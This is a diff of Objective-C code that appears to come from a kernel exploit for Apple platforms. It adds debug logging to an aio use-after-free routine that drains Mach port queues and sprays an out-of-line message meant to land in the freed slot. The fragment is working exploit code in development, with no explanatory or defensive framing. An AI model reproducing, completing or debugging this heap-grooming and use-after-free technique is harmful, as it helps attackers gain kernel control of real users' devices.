@@ -5924,15 +5924,18 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
         [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
 
         if (e1ok && drainPayload && drainPortsReady > 0) {
+            [self appendLog:@"  D: draining 1 msg from port queue..."];
             // Drain ONE message first to make room in port queue (limit=5).
             // Without this, mach_msg(SEND) below blocks forever.
             {
                 DrainMsg drPre;
-                mach_msg(&drPre.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
+                kern_return_t kr = mach_msg(&drPre.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
                          drainPorts[0], 0, MACH_PORT_NULL);
+                [self appendLog:[NSString stringWithFormat:@"  D: drain-pre kr=%d", kr]];
             }
 
             // Spray one more OOL on same CPU → should get same slot as E1
+            [self appendLog:@"  D: sending overlap OOL..."];
             DrainMsg overlapMsg;
             memset(&overlapMsg, 0, sizeof(overlapMsg));
             overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
@@ -5945,15 +5948,19 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
             overlapMsg.ool.size = kDrainOolSize;
             overlapMsg.ool.deallocate = FALSE;
             overlapMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
-            mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg),
+            kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg),
                      0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            [self appendLog:[NSString stringWithFormat:@"  D: overlap send kr=%d", okr]];
             // Drain the overlap message
+            [self appendLog:@"  D: draining overlap msg..."];
             {
                 DrainMsg drOvl;
-                mach_msg(&drOvl.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
+                kern_return_t kr2 = mach_msg(&drOvl.header, MACH_RCV_MSG, 0, sizeof(DrainMsg),
                          drainPorts[0], 0, MACH_PORT_NULL);
+                [self appendLog:[NSString stringWithFormat:@"  D: drain-overlap kr=%d", kr2]];
             }
 
+            [self appendLog:@"  D: checking E1 state..."];
             while (aio_error(&e1) == EINPROGRESS) usleep(100);
             int e1state = aio_error(&e1);
             [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)", e1state, EINVAL]];
@@ -5968,9 +5975,12 @@ static atomic_bool _aioUafRunning = ATOMIC_VAR_INIT(false);
                 [self appendLog:[NSString stringWithFormat:@"  E1 unexpected state: %d", e1state]];
                 if (e1state != EINVAL) aio_return(&e1);
             }
-        } else if (e1ok) {
-            while (aio_error(&e1) == EINPROGRESS) usleep(100);
-            if (aio_error(&e1) == 0) aio_return(&e1);
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"  D: SKIP — e1ok=%d payload=%p ports=%d", e1ok, drainPayload, drainPortsReady]];
+            if (e1ok) {
+                while (aio_error(&e1) == EINPROGRESS) usleep(100);
+                if (aio_error(&e1) == 0) aio_return(&e1);
+            }
         }
     }
 
